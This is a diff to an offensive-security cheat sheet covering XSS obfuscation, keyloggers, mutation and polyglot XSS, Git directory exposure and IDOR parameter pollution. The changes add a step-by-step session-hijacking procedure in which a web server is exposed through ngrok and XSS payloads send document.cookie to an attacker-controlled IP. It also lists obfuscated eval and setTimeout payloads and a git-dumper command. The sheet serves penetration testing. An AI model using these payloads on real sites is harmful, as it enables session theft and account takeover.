@@ -340,42 +340,7 @@ https://portswigger.net/research/using-form-hijacking-to-bypass-csp
 
 #### setTimeout 
 -> Executes JS code contained in a string once after a delay.  
--> e.g. setTimeout("alert('xss')", 1000);  
--> If the delay argument is missing, it executes immediately  
-
-#### Examples of using execution sinks with obfuscation
--> eval + octal  
-```html
-<img src=x onerror="eval('\141lert(1)')"/>
-```
-
--> setInterval + hexadecimal  
-```html
-<img src=x onerror="setInterval('\x61lert(1)')"/>
-```
-
--> setTimeout + hex + octal  
-```html
-<img src=x onerror="setTimeout('\x61\154\145\x72\164\x28\x31\x29')"/>
-```
-
-##### Converters
-- https://checkserp.com/encode/unicode/  
-- http://www.unit-conversion.info/texttools/octal/  
-- http://www.unit-conversion.info/texttools/hexadecimal/
-
-### Obfuscation with Execution Sinks for Bypass
-#### Eval 
--> Execute JS code contained in a string directly  
-
-#### setInterval
--> Executes JS code contained in a string repeatedly after an interval.  
--> e.g. setInterval("alert('xss')", 1000);  
--> If delay is omitted, it is treated as undefined, and the browser uses a minimum delay (~4ms to 10ms)   
-
-#### setTimeout 
--> Executes JS code contained in a string once after a delay.  
--> e.g. setTimeout("alert('xss')", 1000);  
+-> e.g. setTimeout("alert('xss')", 1000);
 -> If the delay argument is missing, it executes immediately  
 
 #### Examples of using execution sinks with obfuscation
@@ -453,19 +418,19 @@ https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html  
 
 ### XSS Keylogger
-An XSS keylogger is a malicious script injected into pages vulnerable to Cross-Site Scripting (XSS), with the aim of capturing victims' keystrokes. By intercepting keyboard events in the browser, the attacker can record passwords, messages and other sensitive data.
+The XSS keylogger is a malicious script that can be injected into applications vulnerable to Cross-Site Scripting (XSS), with the aim of capturing victims' keystrokes. By intercepting keyboard events in the browser, the attacker can record passwords, messages and other sensitive data.
 -> Useful Links  
 https://rapid7.com/blog/post/2012/02/21/metasploit-javascript-keylogger/  
 https://github.com/hadynz/xss-keylogger
 
 ### XSS Mutation
-Mutation XSS is a type of XSS that exploits the process of "cleaning" and reinterpreting HTML by the browser. Even after content is filtered by mechanisms like DOMPurify, it can suffer internal mutations that reactivate malicious payloads. This attack is particularly effective against filters based solely on input analysis, without considering browser behavior.  
+XSS Mutation is an exploitation method for the Cross-Site Scripting vulnerability that exploits the process of "cleaning" and interpreting HTML by the browser. Even after content is filtered by mechanisms like DOMPurify, it can undergo internal mutations that reactivate malicious payloads. This attack is particularly effective against filters based solely on input analysis, without considering browser behavior.  
 -> Useful Links  
 https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss  
 http://www.businessinfo.co.uk/labs/mxss/
 
 ### XSS Polyglot
-An XSS Polyglot is a malicious payload built to work in several execution contexts simultaneously (HTML, JavaScript, attributes, etc.). This technique allows for filter evasion and consistent payload execution across multiple scenarios, making it a powerful tool for discovering and exploiting XSS vulnerabilities, as demonstrated in real-world attacks on large platforms.  
+A polyglot XSS is a malicious payload constructed to function in multiple execution contexts simultaneously. This technique allows for filter evasion and consistent payload execution across multiple scenarios, making it a good choice for discovering and exploiting XSS vulnerabilities, as demonstrated in real-world attacks on large platforms.  
 -> Useful Links  
 https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot  
 https://portswigger.net/research/finding-dom-polyglot-xss-in-paypal-the-easy-way
@@ -499,7 +464,23 @@ https://malwaredecoder.com/
 ```
 
 ### XSS - Session Hijacking
--> An XSS (Cross-Site Scripting) attack can be used for session hijacking by allowing an attacker to inject malicious code into a web page, which is executed in the victim's browser. This code can access and steal session cookies, such as document.cookie, and send them to the server controlled by the attacker, allowing unauthorized access to the victim's account.
+-> After finding an application vulnerable to an XSS (Cross-Site Scripting) attack, one of the vectors that can be used is session hijacking, allowing an attacker to inject malicious code into a web page, which will be executed in the victim's browser. This code can steal session cookies with the "document.cookie" property, and send them to the server controlled by the attacker, allowing unauthorized access to the victim's account.
+
+1- Start a web server  
+```
+sudo service apache2 start
+```
+2- Tunnel with ngrok on the same port as your web server  
+```
+ngrok http 80
+```
+
+3- Observe web server logs in real time  
+```
+tail -f /var/log/apache2/access.log
+```
+
+4- Execute the payload, below are some options:
 ```js
 <script>new Image().src="http://<IP>/ok.jpg?output="+document.cookie;</script>
 <script type="text/javascript">document.location="http://<IP>/?cookie="+document.cookie;</script>  
@@ -507,6 +488,9 @@ https://malwaredecoder.com/
 <script>document.location="http://<IP>/?cookie="+document.cookie;</script>  
 <script>fetch('http://<IP>/?cookie=' + btoa(document.cookie));</script>  
 ```
+
+5- Check the cookies received in the web server logs (it is important first of all to analyze the application and understand its session management and understand whether the cookie received is a session cookie).  
+* If cookies have the "HttpOnly" security attribute, you will not be able to obtain them through XSS.
 
 ### XSS Tools
 -> dalfox  
@@ -525,7 +509,8 @@ https://github.com/KathanP19/Gxss
 https://raw.githubusercontent.com/esetal/nuclei-bb-templates/master/xss-fuzz.yaml
 
 ## Git Exposed
-The vulnerability known as Git Exposed occurs when the .git directory of a Git repository is left publicly accessible on web servers, allowing an attacker to download the entire project history, including sensitive files, credentials, source code and information that should be restricted, which can lead to the exposure of critical data and facilitate more advanced attacks.
+Git exposed occurs when the .git directory of a Git repository becomes publicly accessible on web servers, allowing an attacker to download the entire project history, including sensitive files, credentials, source code, and information that should be restricted, which can lead to the exposure of critical data and facilitate other chain attacks.
+
 ### git-dumper
 ```bash
 git-dumper http://site.com/.git .
@@ -546,11 +531,14 @@ https://github.com/internetwache/GitTools
 #### IDOR + Parameter Pollution
 ##### HTTP Parameter Pollution
 ```HTTP
-GET /api/v1/messages?id=<Another_User_ID> #unauthourized
-GET /api/v1/messages?id=<You_User_ID>&id=<Another_User_ID> #authorized
-GET /api/v1/messages?id[]=<Your_User_ID>&id[]=<Another_User_ID>
+GET /api/v1/messages?id=<another_user_ID> #unauthourized
+GET /api/v1/messages?id=<you_User_ID>&id=<another_user_ID> #authorized
 ```
-	
+or
+```
+GET /api/v1/messages?id[]=<your_user_ID>&id[]=<another_user_ID> #authorized
+```
+
 ##### Json Parameter Pollution
 ```HTTP
 POST /api/v1/messages
